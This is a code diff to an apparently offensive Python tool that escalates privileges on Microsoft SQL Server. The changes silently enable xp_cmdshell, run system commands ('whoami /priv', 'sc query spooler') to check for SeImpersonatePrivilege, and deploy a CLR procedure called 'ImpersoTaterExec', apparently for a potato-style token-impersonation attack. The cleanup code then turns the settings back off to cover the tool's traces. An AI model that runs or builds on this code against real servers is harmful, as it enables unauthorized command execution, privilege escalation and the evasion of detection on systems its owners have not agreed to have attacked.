@@ -133,7 +133,7 @@ def deploy_clr(sql, dll_path, cmd, technique):
     return result
 
 
-def cleanup_clr(sql, restore_strict):
+def cleanup_clr(sql, restore_strict, restore_xpc=False):
     print('\n[*] Cleaning up...')
     sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
 
@@ -145,7 +145,20 @@ def cleanup_clr(sql, restore_strict):
         print('[*] Restoring CLR strict security...')
         sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")
 
+    if restore_xpc:
+        print('[*] Restoring xp_cmdshell...')
+        sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;")
+
     print('[+] Cleanup complete')
+
+
+def _ensure_xp_cmdshell(sql):
+    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'xp_cmdshell'")
+    if '1' in out:
+        return False
+    sql_exec_raw(sql, "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
+    sql_exec_raw(sql, "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
+    return True
 
 
 def enumerate_target(sql):
@@ -170,13 +183,19 @@ def enumerate_target(sql):
         print('[!] Not sysadmin — CLR deployment requires sysadmin', file=sys.stderr)
         sys.exit(1)
 
+    xpc_was_off = _ensure_xp_cmdshell(sql)
+    if xpc_was_off:
+        print('    [*] Enabled xp_cmdshell')
+    info['xpc_was_off'] = xpc_was_off
+
     out = sql_exec_raw(sql, "EXEC xp_cmdshell 'whoami /priv'")
     info['privs'] = out
     has_impersonate = 'SeImpersonatePrivilege' in out and 'Enabled' in out
     print(f'    SeImpersonatePrivilege: {has_impersonate}')
 
     if not has_impersonate:
-        print('[!] SeImpersonatePrivilege not available', file=sys.stderr)
+        print(f'[!] SeImpersonatePrivilege not available', file=sys.stderr)
+        print(f'[!] xp_cmdshell returned: {out[:200]}', file=sys.stderr)
         sys.exit(1)
 
     out = sql_exec_raw(sql, "EXEC xp_cmdshell 'sc query spooler'")
@@ -299,7 +318,7 @@ def main():
     result = deploy_clr(sql, dll_path, cmd, args.technique)
 
     if not args.no_cleanup:
-        cleanup_clr(sql, strict_was_on)
+        cleanup_clr(sql, strict_was_on, info.get('xpc_was_off', False))
 
     try:
         os.remove(dll_path)
